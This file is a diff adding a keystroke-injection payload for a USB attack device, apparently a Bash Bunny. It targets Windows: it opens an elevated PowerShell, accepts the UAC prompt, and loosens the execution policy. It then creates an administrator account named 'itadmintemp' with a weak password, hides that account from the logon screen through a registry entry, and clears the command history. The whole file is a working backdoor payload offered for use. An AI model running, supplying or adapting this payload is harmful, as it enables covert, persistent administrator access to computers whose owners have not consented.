@@ -1,0 +1,64 @@
+# Set attack modes, just need HID for this payload
+ATTACKMODE HID
+
+# Initial settings
+LED SETUP
+QUACK DELAY 3000
+
+# Set victim language, if needed
+#DUCKY_LANG us
+DUCKY_LANG se
+
+LED ATTACK
+QUACK DELAY 3000
+
+# Start PowerShell
+#RUN WIN powershell Start-Process powershell -Verb runAs -windowstyle hidden
+#RUN WIN powershell Start-Process powershell -Verb runAs
+QUACK GUI r
+QUACK DELAY 1000
+QUACK STRING powershell Start-Process powershell -Verb runAs
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 3000
+QUACK ALT y
+QUACK DELAY 2000
+QUACK STRING Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:\$false
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING A
+QUACK DELAY 1000
+QUACK ENTER
+
+# Add new user
+LED STAGE1
+QUACK DELAY 3000
+QUACK STRING NET USER itadmintemp temptemptemp /ADD
+QUACK ENTER
+QUACK DELAY 1000
+
+# Add new user to the Administrator group
+LED STAGE2
+QUACK DELAY 3000
+QUACK STRING NET LOCALGROUP Administrators itadmintemp /ADD
+QUACK ENTER
+QUACK DELAY 1000
+
+# Hide the user
+LED STAGE3
+QUACK DELAY 3000
+QUACK STRING reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\\SpecialAccounts\\UserList\" /v itadmintemp /t REG_DWORD /d 0 /f
+QUACK ENTER
+QUACK DELAY 1000
+
+LED CLEANUP
+QUACK DELAY 3000
+QUACK STRING Clear-History
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING exit
+QUACK ENTER
+
+# Done!
+LED FINISH
